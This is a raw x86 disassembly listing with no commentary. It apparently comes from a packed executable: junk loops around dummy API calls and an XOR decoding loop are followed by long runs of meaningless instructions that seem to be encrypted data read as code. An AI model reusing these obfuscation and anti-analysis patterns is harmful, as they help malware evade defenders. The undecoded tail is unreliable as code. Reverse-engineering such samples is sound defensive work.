  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xfe,al
  41049c:	xor    eax,0xb0dcd2f4
  4104a1:	jle    0x410521
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x410475
  4104a8:	xchg   ecx,eax
  4104a9:	or     eax,0x35d5d33c
  4104ae:	mov    WORD PTR [ebx-0x509af422],cs
  4104b4:	jge    0x410473
  4104b6:	rol    DWORD PTR [ecx],0x2f
  4104b9:	xchg   BYTE PTR [esi],dh
  4104bb:	(bad)  
  4104bc:	jmp    0x4e50a8e9
  4104c1:	jp     0x41050e
  4104c3:	and    esi,DWORD PTR [edi]
  4104c5:	scas   al,BYTE PTR es:[edi]
  4104c6:	lahf   
  4104c7:	dec    edi
  4104c8:	gs pop edi
  4104ca:	pop    ds
  4104cb:	jb     0x41046f
  4104cd:	pop    es
  4104ce:	dec    ebx
  4104cf:	icebp  
  4104d0:	cdq    
  4104d1:	shl    DWORD PTR [ecx-0x39],0x72
  4104d5:	aam    0xf5
  4104d7:	inc    esp
  4104d8:	push   edi
  4104d9:	test   esi,0x740e7f8a
  4104df:	sbb    al,0x82
  4104e1:	jge    0x4104c4
  4104e3:	popf   
  4104e4:	cs loopne 0x410485
  4104e7:	jle    0x4104e1
  4104e9:	in     al,dx
  4104ea:	fs sbb al,0x2d
  4104ed:	cmp    edi,DWORD PTR [ebp+0x638e1d87]
  4104f3:	jle    0x41050f
  4104f5:	push   ds
  4104f6:	push   ds
  4104f7:	mov    edi,0xab1b8095
  4104fc:	in     eax,0xf6
  4104fe:	jmp    0x4ab998
  410503:	jecxz  0x4104ce
  410505:	test   DWORD PTR [edi+0x57],ebx
  410508:	push   esp
  410509:	stos   DWORD PTR es:[edi],eax
  41050a:	jns    0x41056d
  41050c:	fstp   TBYTE PTR [edx]
  41050e:	xor    DWORD PTR [esi],edx
  410510:	lea    edi,[esi+0x54113645]
  410516:	cdq    
  410517:	test   BYTE PTR [esi-0x773946fa],ch
  41051d:	icebp  
  41051e:	scas   al,BYTE PTR es:[edi]
  41051f:	inc    esi
  410520:	mov    cl,0xc0
  410522:	popf   
  410523:	pop    ebx
  410524:	ret    0x620d
  410527:	pushf  
  410528:	popa   
  410529:	jmp    0x4104ac
  41052b:	outs   dx,BYTE PTR ds:[esi]
  41052c:	(bad)  
  41052e:	adc    bl,BYTE PTR [esi+eax*4-0x25e71fa9]
  410535:	bnd jo 0x410543
  410538:	int3   
  410539:	sub    eax,0x9b062821
  41053e:	mov    al,ds:0x327f8557
  410543:	das    
  410544:	pop    eax
  410545:	mov    DWORD PTR [ecx-0x7ca522ab],ebp
  41054b:	mov    ss,esi
  41054d:	das    
  41054e:	jle    0x4105c6
  410550:	int    0x11
  410552:	add    eax,0x88cdf8ad
  410557:	shl    BYTE PTR [edx+0x37],cl
  41055a:	sahf   
  41055b:	push   eax
  41055c:	test   DWORD PTR [edi+edi*2-0x54],0x48d71d42
  410564:	or     eax,0x78fc868
  410569:	mov    al,0x36
  41056b:	(bad)  
  41056c:	cs popa 
  41056e:	scas   al,BYTE PTR es:[edi]
  41056f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410570:	xor    eax,0x151f0cbf
  410575:	leave  
  410576:	xor    al,0x9e
  410578:	adc    al,0x3e
  41057a:	stos   BYTE PTR es:[edi],al
  41057b:	test   BYTE PTR [ecx+eax*1-0x10],0x56
  410580:	sbb    BYTE PTR [ecx-0x23],al
  410583:	repz mov dh,0x8c
  410586:	dec    esp
  410587:	jns    0x41053e
  410589:	(bad)
  41058c:	test   BYTE PTR [edi-0x40],bh
  41058f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410590:	ret    0xadfb
  410593:	popa   
  410594:	out    dx,al
  410595:	fucomip st,st(3)
  410597:	out    dx,al
  410598:	mov    ds:0x90e2d1e8,al
  41059d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41059e:	mov    ecx,0xc5df329f
  4105a3:	and    BYTE PTR [edx+eax*2-0x73],ch
  4105a7:	pop    esp
  4105a8:	fwait
  4105a9:	pop    edx
  4105aa:	dec    ebp
  4105ab:	aam    0x40
  4105ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105ae:	adc    edi,DWORD PTR [ebx-0x7f]
  4105b1:	test   DWORD PTR [ebx-0x3a],0x9a43f0e
  4105b8:	push   0x4d
  4105ba:	cwde   
  4105bb:	test   eax,0x7fbd0cf5
  4105c0:	loop   0x410628
  4105c2:	jecxz  0x41055d
  4105c4:	add    dh,BYTE PTR [ecx+0x54ff2cb]
  4105ca:	test   DWORD PTR [ebx-0x5a16d37b],ecx
  4105d0:	sbb    DWORD PTR [ebx+0x22],esi
  4105d3:	adc    DWORD PTR [ecx+0x42e7faba],ecx
  4105d9:	enter  0x221a,0x6b
  4105dd:	sub    al,0x42
  4105df:	rcr    BYTE PTR [esi+0x23a91ca3],cl
  4105e5:	xor    BYTE PTR [ecx+eax*4-0x3f],cl
  4105e9:	sub    al,0xf2
  4105eb:	or     dh,BYTE PTR [edx-0x66]
  4105ee:	xchg   ecx,eax
  4105ef:	mov    bh,BYTE PTR [ebp+0x212ed667]
  4105f5:	sub    al,0x4
  4105f7:	inc    esp
  4105f8:	push   edx
  4105f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105fa:	add    al,0xbf
  4105fc:	into   
  4105fd:	add    eax,0xba8ee290
  410602:	sub    al,0x1b
  410604:	(bad)  
  410605:	sub    edi,DWORD PTR [esi]
  410607:	adc    dh,bh
  410609:	aas    
  41060a:	popf   
  41060b:	mov    bl,dl
  41060d:	dec    esp
  41060e:	jge    0x41061d
  410610:	mov    esi,0x427d5f75
  410615:	push   ebp
  410616:	mov    ecx,0x84f109d
  41061b:	mov    ebx,0x31d4286c
  410620:	dec    esp
  410621:	xchg   esp,eax
  410622:	in     eax,0x4b
  410624:	hlt    
  410625:	jo     0x4105b2
  410627:	das    
  410628:	(bad)  
  41062a:	fsub   QWORD PTR [ecx+ecx*2]
  41062d:	arpl   ax,ax
  41062f:	in     al,dx
  410630:	sub    cl,BYTE PTR [ebx-0x5e]
  410633:	xor    al,0x17
  410635:	in     eax,dx
  410636:	clc    
  410637:	push   0x25394134
  41063c:	mov    esp,0x9422ad9e
  410641:	or     BYTE PTR [edx+0x7bd53e74],cl
  410647:	nop
  410648:	sbb    BYTE PTR [edx+0x4e],0xb0
  41064c:	push   esi
  41064d:	cmp    DWORD PTR [ebp+0x30],0x9d08cd2b
  410654:	add    eax,edx
  410656:	pop    ecx
  410657:	shl    ebp,cl
  410659:	retf   
  41065a:	mov    al,ds:0x961eafd1
  41065f:	xchg   dh,cl
  410661:	ds loopne 0x410695
  410664:	jl     0x4105f4
  410666:	push   ebx
  410667:	call   FWORD PTR [eax+0x76]
  41066a:	stos   DWORD PTR es:[edi],eax
  41066b:	cld    
  41066c:	adc    DWORD PTR [ebx+edi*2-0x44],edx
  410670:	sahf   
  410671:	add    ah,BYTE PTR [ecx+eiz*1+0xb]
  410675:	cmp    eax,DWORD PTR [edx+0x38]
  410678:	fnsave ds:0xee7df879
  41067e:	aas    
  41067f:	in     eax,0xb1
  410681:	push   edi
  410682:	mov    ah,0x6a
  410684:	xor    ebx,ebp
  410686:	mov    eax,ds:0x2fef192e
  41068b:	and    BYTE PTR ds:0xd0d9aef6,dl
  410691:	fnstsw WORD PTR [eax+0x0]
  410694:	jg     0x410631
  410696:	jp     0x410655
  410698:	push   ebp
  410699:	daa    
  41069a:	rol    BYTE PTR [ebx+0x69],0x44
  41069e:	fbstp  TBYTE PTR [ecx+0x62661fd4]
  4106a4:	cmp    dl,cl
  4106a6:	xchg   edx,eax
  4106a7:	fdiv   DWORD PTR [ecx+0x63]
  4106aa:	xchg   edi,eax
  4106ab:	cmp    eax,0x75ced0a4
  4106b0:	stos   DWORD PTR es:[edi],eax
  4106b1:	sub    esp,edx
  4106b3:	addr16 aaa 
  4106b5:	mov    ebp,0xf27b2b33
  4106ba:	xlat   BYTE PTR ds:[ebx]
  4106bb:	fld    QWORD PTR [eax]
  4106bd:	inc    ecx
  4106be:	mov    edi,0x81f3d7df
  4106c3:	lahf   
  4106c4:	scas   eax,DWORD PTR es:[edi]
  4106c5:	dec    ebp
  4106c6:	fs jle 0x41071c
  4106c9:	push   ebx
  4106ca:	or     eax,0x1856cf76
  4106cf:	or     edx,ebx
  4106d1:	shl    DWORD PTR [esi+0x30f3835f],cl
  4106d7:	shl    esp,cl
  4106d9:	and    dl,al
  4106db:	dec    eax
  4106dc:	jns    0x41074e
  4106de:	pop    edx
  4106df:	cmp    esi,DWORD PTR [ebp-0x55612445]
  4106e5:	mov    dh,BYTE PTR [edi+edx*1-0x220ac67a]
  4106ec:	adc    eax,0x70d50153
  4106f1:	cmp    BYTE PTR [edx-0x79],al
  4106f4:	pinsrw mm1,WORD PTR [edx-0xf68792f],0x54
  4106fc:	fbstp  TBYTE PTR [edi-0x27]
  4106ff:	ffree  st(6)
  410701:	adc    eax,0xcb6fc10d
  410706:	xor    cl,BYTE PTR [ebp-0x69]
  410709:	push   0x2d25f74c
  41070e:	lods   eax,DWORD PTR ds:[esi]
  41070f:	mov    dl,0x37
  410711:	mov    esi,0x3ea841cb
  410716:	repnz test al,0xaf
  410719:	adc    cl,BYTE PTR [ecx+0x5d]
  41071c:	or     BYTE PTR [edx+edx*2+0x1],0x43
  410721:	push   cs
  410722:	int3   
  410723:	es call 0x6d33:0xef9e4dec
  41072b:	aas    
  41072c:	add    esi,ebx
  41072e:	or     al,0xc4
  410730:	lahf   
  410731:	into   
  410732:	jno    0x4106cc
  410734:	sbb    al,0xae
  410736:	xlat   BYTE PTR ds:[ebx]
  410737:	bound  esi,QWORD PTR [eax+0x29]
  41073a:	jmp    0xa38b:0x849e4257
  410741:	stc    
  410742:	lock cmc 
  410744:	ds push ebp
  410746:	ja     0x41072c
  410748:	loopne 0x4106d5
  41074a:	push   esp
  41074b:	fdivr  DWORD PTR [eax-0x5b]
  41074e:	sbb    ebx,eax
  410750:	mov    DWORD PTR [ebp+0x49],ebx
  410753:	dec    ebx
  410754:	or     ecx,ebp
  410756:	ds push ebp
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x9a3def00
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410769
  41078c:	push   ss
  41078d:	ror    esp,0x8c
  410790:	pop    esi
  410791:	cld    
  410792:	pop    edx
  410793:	dec    esp
  410794:	mov    dl,0xcd
  410796:	fnstsw ax
  410798:	push   ss
  410799:	jp     0x41077e
  41079b:	pusha  
  41079c:	mov    ecx,DWORD PTR [ebx-0x4]
  41079f:	ss mov bh,0xed
  4107a2:	inc    DWORD PTR [edi]
  4107a4:	mov    dl,BYTE PTR [bp+di]
  4107a7:	in     eax,dx
  4107a8:	ror    DWORD PTR [ecx+0x19],1
  4107ab:	(bad)  
  4107ac:	ror    BYTE PTR [ebx-0x58],cl
  4107af:	pop    edx
  4107b0:	fistp  QWORD PTR [edx+0x77]
  4107b3:	or     DWORD PTR [eax+0x638cca4f],eax
  4107b9:	or     BYTE PTR [edx+0x1462ee28],dh
  4107bf:	cmp    esp,DWORD PTR [ecx-0x8525239]
  4107c5:	pop    ecx
  4107c6:	les    ebx,FWORD PTR [ebx]
  4107c8:	int3   
  4107c9:	mov    eax,ds:0xec3f9f99
  4107ce:	inc    ecx
  4107cf:	mov    ecx,0xfcecec2c
  4107d4:	jle    0x410821
  4107d6:	push   es
  4107d7:	shl    DWORD PTR [eax],0x76
  4107da:	inc    esp
  4107db:	or     eax,0xb8c59091
  4107e0:	arpl   WORD PTR [edi],si
  4107e2:	xchg   bl,dl
  4107e4:	mov    BYTE PTR [eax+0x52829663],0x17
  4107eb:	imul   eax,DWORD PTR [esi],0x19
  4107ee:	test   BYTE PTR ds:0xd1e883f0,bh
  4107f4:	lock es cdq 
  4107f7:	or     edx,0x36e0a321
  4107fd:	or     dl,dh
  4107ff:	aas    
  410800:	scas   eax,DWORD PTR es:[edi]
  410801:	jmp    0x41086a
  410803:	ins    DWORD PTR es:[edi],dx
  410804:	call   0xe5cd:0xc6141277
  41080b:	sub    ch,bh
  41080d:	jne    0x410813
  41080f:	retf   0xdc04
  410812:	mov    cl,bl
  410814:	jne    0x4107e9
  410816:	xchg   ebp,eax
  410817:	mov    eax,ds:0xd47ed9fa
  41081c:	stos   BYTE PTR es:[edi],al
  41081d:	call   0x54f5:0xcef5f75d
  410824:	call   0x6b765caf
  410829:	enter  0xbf01,0xb0
  41082d:	out    dx,eax
  41082e:	call   0x5b24f25a
  410833:	pushf  
  410834:	aam    0x1c
  410836:	int3   
  410837:	jmp    0xad43:0x526a23ac
  41083e:	push   edx
  41083f:	int3   
  410840:	add    ebx,DWORD PTR [ecx-0x55]
  410843:	adc    ebx,esi
  410845:	rol    bl,cl
  410847:	mov    ds:0x93b09bf5,al
  41084c:	pop    ebp
  41084d:	test   DWORD PTR [ecx],0xc08b1432
  410853:	mov    ch,0x71
  410855:	or     al,BYTE PTR [edx]
  410857:	iret   
  410858:	cs xchg ebp,eax
  41085a:	leave  
  41085b:	or     eax,0xe7fb3d29
  410860:	fnstcw WORD PTR [edx]
  410862:	test   al,0x85
  410864:	jmp    0x1128:0x5a751d89
  41086b:	adc    eax,0xb153134a
  410870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410871:	and    ecx,ebx
  410873:	(bad)  
  410874:	push   ecx
  410875:	cmp    eax,0xb0453fbc
  41087a:	mov    ch,0x18
  41087c:	loop   0x410877
  41087e:	inc    esp
  41087f:	aad    0xcc
  410881:	mov    al,ds:0xc2a85a3b
  410886:	out    dx,al
  410887:	jmp    0x410858
  410889:	sub    dh,ch
  41088b:	std    
  41088c:	sbb    BYTE PTR [eax],cl
  41088e:	(bad)  
  41088f:	popf   
  410890:	test   BYTE PTR [ebx-0x5374d933],dl
  410896:	aaa    
  410897:	test   BYTE PTR [ebx-0x498633bc],0x4b
  41089e:	faddp  st(4),st
  4108a0:	pop    ebp
  4108a1:	pop    ecx
  4108a2:	out    dx,eax
  4108a3:	pusha  
  4108a4:	ficomp WORD PTR [ecx-0x16]
  4108a7:	cwde   
  4108a8:	ror    DWORD PTR [ecx+0x3a],1
  4108ab:	in     al,dx
  4108ac:	mov    al,0xec
  4108ae:	enter  0xceb5,0x74
  4108b2:	jae    0xfac06f5
  4108b8:	inc    edi
  4108b9:	retf   0x622d
  4108bc:	mov    eax,ds:0xf55e8fa8
  4108c1:	cmp    eax,0x4171b03e
  4108c6:	mov    edi,0xef9ea9e5
  4108cb:	iret   
  4108cc:	mov    esi,esp
  4108ce:	lods   eax,DWORD PTR ds:[esi]
  4108cf:	out    0x9f,al
  4108d1:	icebp  
  4108d2:	aas    
  4108d3:	fwait
  4108d4:	(bad)  
  4108d5:	mov    ch,0x5f
  4108d7:	sahf   
  4108d8:	mov    cl,0x10
  4108da:	mov    ds:0x70148359,eax
  4108df:	xchg   ebp,eax
  4108e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108e1:	jmp    0x41088b
  4108e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108e4:	arpl   WORD PTR [esi+0x2ace468e],ax
  4108ea:	call   0xc80c:0x5bff9b6a
  4108f1:	push   ecx
  4108f2:	jbe    0x41092c
  4108f4:	mov    ebp,0x5c100237
  4108f9:	mov    ebp,0xbeffca1c
  4108fe:	iret   
  4108ff:	cmp    DWORD PTR [ebx+0x2b2ec5e7],0x40
  410906:	sbb    eax,0xbf10423f
  41090b:	dec    ebx
  41090c:	push   es
  41090d:	jne    0x41091b
  41090f:	dec    edi
  410910:	or     dl,BYTE PTR [ecx+0x50]
  410913:	mov    bh,0xfe
  410915:	retf   
  410916:	not    DWORD PTR [edi-0x1d2536bc]
  41091c:	shl    DWORD PTR [ebx-0x3d],cl
  41091f:	mov    al,ds:0xe893fc44
  410924:	jne    0x4108c8
  410926:	mov    ebp,0x42840a74
  41092b:	ret    
  41092c:	xchg   ebp,eax
  41092d:	sbb    al,0x2e
  41092f:	sub    eax,0xe5180be7
  410934:	rcr    BYTE PTR [edi],cl
  410936:	add    eax,0x88dd6a0e
  41093b:	les    ecx,FWORD PTR [edx+0x5f]
  41093e:	in     al,dx
  41093f:	cmp    al,BYTE PTR [esi+eax*8]
  410942:	add    al,0xfb
  410944:	xchg   edi,eax
  410945:	sti    
  410946:	xor    al,0xd
  410948:	(bad)  [ebp-0x48]
  41094b:	xchg   esi,eax
  41094c:	adc    al,0x33
  41094e:	or     ecx,esp
  410950:	pusha  
  410951:	loopne 0x4109a8
  410953:	sub    BYTE PTR [ebx+ecx*4+0x5],ah
  410957:	ds mov ah,0xf6
  41095a:	(bad)  
  41095b:	pop    eax
  41095c:	pushf  
  41095d:	mov    ds:0xd2077b16,eax
  410962:	outs   dx,BYTE PTR ds:[esi]
  410963:	repz js 0x41097a
  410966:	mov    ebx,DWORD PTR [ebp-0x12]
  410969:	mov    esi,0xdf6c5ce5
  41096e:	xor    al,0xdd
  410970:	dec    esp
  410971:	test   BYTE PTR ds:0x6955be53,0x14
  410978:	adc    DWORD PTR [eax-0x1e],esp
  41097b:	aaa    
  41097c:	cmp    bh,ah
  41097e:	das    
  41097f:	das    
  410980:	jo     0x4109c0
  410982:	cmp    eax,0xfefcf0d4
  410987:	data16 or ch,BYTE PTR [edx+ecx*8-0x5dcc01de]
  41098f:	(bad)  
  410990:	cmp    edx,DWORD PTR [edx-0x31]
  410993:	fwait
  410994:	sbb    DWORD PTR [esp+eax*1-0x4d],ebp
  410998:	mov    ebp,0xada2cf8
  41099d:	push   ds
  41099e:	xor    al,0x36
  4109a0:	jmp    0x41099f
  4109a2:	scas   al,BYTE PTR es:[edi]
  4109a3:	xor    eax,0x4ab0a432
  4109a8:	imul   ebp,DWORD PTR [edi-0x17],0x1f
  4109ac:	sub    DWORD PTR [edx-0x61],ebp
  4109af:	xchg   edi,eax
  4109b0:	mov    ebp,0xc6f60b37
  4109b5:	call   0xb47c:0xb7518504
  4109bc:	jle    0x410a31
  4109be:	jae    0x41099a
  4109c0:	lea    esp,[ecx-0x53596ed0]
  4109c6:	cld    
  4109c7:	push   ecx
  4109c8:	test   eax,0xba8cd97
  4109cd:	pop    es
  4109ce:	mov    bl,0x5d
  4109d0:	or     ecx,edi
  4109d2:	push   0xffffffc2
  4109d4:	pop    ds
  4109d5:	and    DWORD PTR [eax-0x68865d9a],ebx
  4109db:	outs   dx,DWORD PTR ds:[esi]
  4109dc:	stos   BYTE PTR es:[edi],al
  4109dd:	sub    DWORD PTR [ebx+0x2e],edx
  4109e0:	cld    
  4109e1:	outs   dx,DWORD PTR ds:[esi]
  4109e2:	and    cl,BYTE PTR [edi-0x7b]
  4109e5:	clc    
  4109e6:	ror    BYTE PTR [eax-0x1d],1
  4109e9:	gs xor ecx,edi
  4109ec:	xor    edi,DWORD PTR [eax+edi*8-0x28f6d510]
  4109f3:	sub    edx,edi
  4109f5:	mov    ebp,0x3a0ee270
  4109fa:	dec    ebp
  4109fb:	xchg   DWORD PTR [eax-0x2488fcf5],edi
  410a01:	pop    es
  410a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a03:	call   0x9577d72c
  410a08:	ja     0x4109df
  410a0a:	add    al,0x94
  410a0c:	mov    esp,0x769d83b6
  410a11:	push   ds
  410a12:	or     BYTE PTR [edx+0x1b],ah
  410a15:	push   eax
  410a16:	pop    esp
  410a17:	ret    0x702e
  410a1a:	into   
  410a1b:	fnstcw WORD PTR [ebx]
  410a1d:	sbb    cl,dh
  410a1f:	dec    esi
  410a20:	push   DWORD PTR [esi+eiz*2-0x2f]
  410a24:	cmp    bl,0xbe
  410a27:	fild   WORD PTR [edx+0x9]
  410a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a2b:	repnz or ecx,DWORD PTR gs:[ebp-0x717658c2]
  410a33:	add    DWORD PTR [edx+0x4d],0x2c92dbcc
  410a3a:	pushf  
  410a3b:	pop    esi
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	sbb    esp,edx
  410a51:	push   esp
  410a52:	call   0x7caf:0x7e7ebdba
  410a59:	jle    0x410ad9
  410a5b:	mov    dl,0xa3
  410a5d:	xor    al,0xb1
  410a5f:	pop    eax
  410a60:	loop   0x410ad7
  410a62:	mov    bh,0x4f
  410a64:	push   ecx
  410a65:	or     BYTE PTR [eax],dh
  410a67:	imul   ebp,DWORD PTR [edi],0x75
  410a6a:	popa   
  410a6b:	sti    
  410a6c:	je     0x410a60
  410a6e:	push   esp
  410a6f:	out    dx,eax
  410a70:	and    eax,0xc79ea0e0
  410a75:	sbb    al,BYTE PTR [esi+ebx*8]
  410a78:	pop    edx
  410a79:	into   
  410a7a:	scas   eax,DWORD PTR es:[edi]
  410a7b:	cdq    
  410a7c:	(bad)  
  410a7d:	push   edx
  410a7e:	mov    eax,0x1f668c0d
  410a83:	xor    DWORD PTR [eax],0xffffff92
  410a86:	scas   eax,DWORD PTR es:[edi]
  410a87:	(bad)  
  410a88:	lahf   
  410a89:	ins    DWORD PTR es:[edi],dx
  410a8a:	fsub   QWORD PTR [ecx+0x5a]
  410a8d:	fisub  WORD PTR [eax-0x69]
  410a90:	mov    ebx,0xe5b8db2d
  410a95:	push   esi
  410a96:	dec    eax
  410a97:	xchg   ebx,eax
  410a98:	mov    dl,0xd4
  410a9a:	mov    bh,0xe9
  410a9c:	aas    
  410a9d:	xchg   edx,eax
  410a9e:	add    eax,0x16f362a6
  410aa3:	push   eax
  410aa4:	inc    esi
  410aa5:	imul   edi,DWORD PTR [eax-0x2223ebdd],0xd3dad4ae
  410aaf:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  410ab1:	(bad)  
  410ab2:	dec    ecx
  410ab3:	jmp    0xdda0134a
  410ab8:	out    0x6b,eax
  410aba:	push   cs
  410abb:	pusha  
  410abc:	pop    es
  410abd:	xor    DWORD PTR [esi+ebx*1],edx
  410ac0:	lods   al,BYTE PTR ds:[esi]
  410ac1:	arpl   WORD PTR [ebp-0x31cfecaf],bp
  410ac7:	(bad)  
  410ac8:	cmp    ebx,eax
  410aca:	pop    esp
  410acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410acc:	mov    esp,0x75d6e296
  410ad1:	int3   
  410ad2:	outs   dx,DWORD PTR ds:[esi]
  410ad3:	test   DWORD PTR [esi-0xb065bb9],ebp
  410ad9:	cmp    eax,0xe39db21b
  410ade:	std    
  410adf:	pop    edx
  410ae0:	xor    al,0x7e
  410ae2:	sbb    eax,0x7cd70c65
  410ae7:	idiv   ch
  410ae9:	inc    edx
  410aea:	jge    0x410b5d
  410aec:	out    0x22,al
  410aee:	push   esi
  410aef:	pop    ebp
  410af0:	dec    edx
  410af1:	sbb    ebx,DWORD PTR [edi]
  410af3:	mov    eax,0xd0fdb871
  410af8:	sbb    dl,BYTE PTR [edx-0x57a5df79]
  410afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aff:	mov    ch,0x74
  410b01:	adc    eax,0x68cff5a3
  410b06:	mov    eax,ds:0x790a3e59
  410b0b:	aaa    
  410b0c:	not    ecx
  410b0e:	xor    DWORD PTR [esi-0x3c],esi
  410b11:	mov    edx,0xdc58aa5c
  410b16:	adc    al,0x3c
  410b18:	(bad)  
  410b19:	sbb    DWORD PTR [ecx],esp
  410b1b:	dec    edi
